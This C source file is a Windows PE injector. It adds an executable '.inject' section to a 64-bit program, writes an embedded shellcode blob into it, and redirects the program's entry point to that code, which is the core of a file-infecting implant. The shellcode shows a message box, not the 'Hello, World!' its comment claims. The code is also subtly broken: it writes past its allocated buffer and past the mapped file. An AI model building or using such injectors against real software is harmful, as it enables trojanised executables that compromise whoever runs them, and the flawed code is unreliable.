#include <windows.h>
#include <stdio.h>
#include <stdbool.h>

#define ERROR_SYS(x) fprintf(stderr, "Error: %s (Error code: %lu)\n", x, GetLastError())
#define SECTION_NAME ".inject"
#define SECTION_NAME_SIZE 8

typedef struct s_injector
{
    char *target;
    HANDLE file_handle;
    HANDLE file_mapping;
    LPVOID file_view;
    DWORD file_size;
    PIMAGE_NT_HEADERS nt_headers;
    PIMAGE_SECTION_HEADER section_headers;
    WORD number_of_sections;
} t_injector;

// Sample shellcode (prints "Hello, World!" and exits)
unsigned char shellcode[] = 
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
"\x8d\x8d\x1f\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
"\x00\x3e\x4c\x8d\x85\x14\x01\x00\x00\x48\x31\xc9\x41\xba"
"\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
"\x56\xff\xd5\x48\x45\x4c\x4c\x4f\x00\x4d\x65\x73\x73\x61"
"\x67\x65\x42\x6f\x78\x00\x75\x73\x65\x72\x33\x32\x2e\x64"
"\x6c\x6c\x00";
    
void clean_injector(t_injector *injector)
{
    if (injector->file_view)
        UnmapViewOfFile(injector->file_view);
    if (injector->file_mapping)
        CloseHandle(injector->file_mapping);
    if (injector->file_handle != INVALID_HANDLE_VALUE)
        CloseHandle(injector->file_handle);
}

bool map_file(char *pe_filename, t_injector *injector)
{
    injector->file_handle = CreateFile(pe_filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (injector->file_handle == INVALID_HANDLE_VALUE)
    {
        ERROR_SYS("CreateFile");
        return false;
    }

    injector->file_size = GetFileSize(injector->file_handle, NULL);
    if (injector->file_size == INVALID_FILE_SIZE)
    {
        ERROR_SYS("GetFileSize");
        clean_injector(injector);
        return false;
    }

    injector->file_mapping = CreateFileMapping(injector->file_handle, NULL, PAGE_READWRITE, 0, injector->file_size, NULL);
    if (!injector->file_mapping)
    {
        ERROR_SYS("CreateFileMapping");
        clean_injector(injector);
        return false;
    }

    injector->file_view = MapViewOfFile(injector->file_mapping, FILE_MAP_ALL_ACCESS, 0, 0, injector->file_size);
    if (!injector->file_view)
    {
        ERROR_SYS("MapViewOfFile");
        clean_injector(injector);
        return false;
    }

    return true;
}

bool read_pe_header(t_injector *injector)
{
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)injector->file_view;
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
    {
        ERROR_SYS("Invalid DOS signature");
        return false;
    }

    injector->nt_headers = (PIMAGE_NT_HEADERS)((BYTE *)injector->file_view + dos_header->e_lfanew);
    if (injector->nt_headers->Signature != IMAGE_NT_SIGNATURE)
    {
        ERROR_SYS("Invalid NT signature");
        return false;
    }

    if (injector->nt_headers->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
    {
        ERROR_SYS("Unsupported architecture (64-bit only)");
        return false;
    }

    if (!(injector->nt_headers->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE))
    {
        ERROR_SYS("File is not executable");
        return false;
    }

    injector->number_of_sections = injector->nt_headers->FileHeader.NumberOfSections;
    injector->section_headers = IMAGE_FIRST_SECTION(injector->nt_headers);

    return true;
}

void inject_shellcode(t_injector *injector)
{
    PIMAGE_SECTION_HEADER new_section;
    DWORD file_alignment, section_alignment;
    DWORD new_section_rva, new_section_raw_size, new_section_virtual_size;

    // Save the original entry point
    DWORD original_entry_point = injector->nt_headers->OptionalHeader.AddressOfEntryPoint;


    // Jump back routine
    unsigned char jump_to_oep[] = {
        // 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, // mov rax, gs:[0x60]
        // 0x48, 0x8B, 0x40, 0x10,                               // mov rax, [rax+0x10]
        // 0x48, 0x05, 0xAA, 0xAA, 0xAA, 0xAA,                   // add rax, OriginalEntryPointRVA
        // 0xFF, 0xE0                                            // jmp rax
    };

    // Combine shellcode and jump back routine
    size_t shellcode_size = sizeof(shellcode);
    size_t jump_size = sizeof(jump_to_oep);
    size_t total_shellcode_size = shellcode_size + jump_size;

    unsigned char *combined_shellcode = malloc(total_shellcode_size);
    if (!combined_shellcode) {
        fprintf(stderr, "Failed to allocate memory for combined shellcode\n");
        return;
    }

    // Copy the original shellcode
    memcpy(combined_shellcode, shellcode, shellcode_size);

    // Append the jump back routine
    memcpy(combined_shellcode + shellcode_size, jump_to_oep, jump_size);

    // Replace the placeholder with the actual OEP RVA
    size_t oep_placeholder_offset = shellcode_size + 15; // Offset in jump_to_oep
    DWORD oep_rva = original_entry_point;
    memcpy(combined_shellcode + oep_placeholder_offset, &oep_rva, sizeof(DWORD));

    // Proceed with injecting the combined shellcode
    new_section = &injector->section_headers[injector->number_of_sections];

    memcpy(new_section->Name, SECTION_NAME, SECTION_NAME_SIZE);

    file_alignment = injector->nt_headers->OptionalHeader.FileAlignment;
    section_alignment = injector->nt_headers->OptionalHeader.SectionAlignment;

    new_section_rva = (injector->section_headers[injector->number_of_sections - 1].VirtualAddress +
                       injector->section_headers[injector->number_of_sections - 1].Misc.VirtualSize +
                       section_alignment - 1) &
                      ~(section_alignment - 1);

    new_section->VirtualAddress = new_section_rva;
    new_section_virtual_size = (total_shellcode_size + section_alignment - 1) & ~(section_alignment - 1);
    new_section->Misc.VirtualSize = new_section_virtual_size;
    new_section_raw_size = (total_shellcode_size + file_alignment - 1) & ~(file_alignment - 1);
    new_section->SizeOfRawData = new_section_raw_size;
    new_section->PointerToRawData = (injector->section_headers[injector->number_of_sections - 1].PointerToRawData +
                                     injector->section_headers[injector->number_of_sections - 1].SizeOfRawData +
                                     file_alignment - 1) &
                                    ~(file_alignment - 1);
    new_section->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;

    injector->nt_headers->OptionalHeader.SizeOfImage = new_section_rva + new_section_virtual_size;
    injector->nt_headers->FileHeader.NumberOfSections++;

    // Copy the combined shellcode into the new section
    memcpy((BYTE *)injector->file_view + new_section->PointerToRawData, combined_shellcode, total_shellcode_size);

    injector->file_size += new_section_raw_size;

    // Modify entry point to point to our new section
    injector->nt_headers->OptionalHeader.AddressOfEntryPoint = new_section_rva;

    printf("Shellcode injected into new section '%s' at RVA: 0x%08X\n", SECTION_NAME, new_section_rva);
    printf("Original entry point: 0x%08X\n", original_entry_point);

    // Free allocated memory
    free(combined_shellcode);
}

void inject_shellcode_pe(char *target)
{
    t_injector injector = {0};
    injector.target = target;

    if (!map_file(target, &injector))
        return;

    if (!read_pe_header(&injector))
    {
        clean_injector(&injector);
        return;
    }

    inject_shellcode(&injector);

    clean_injector(&injector);
}

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        fprintf(stderr, "Usage: %s <PE file>\n", argv[0]);
        return 1;
    }

    inject_shellcode_pe(argv[1]);
    return 0;
}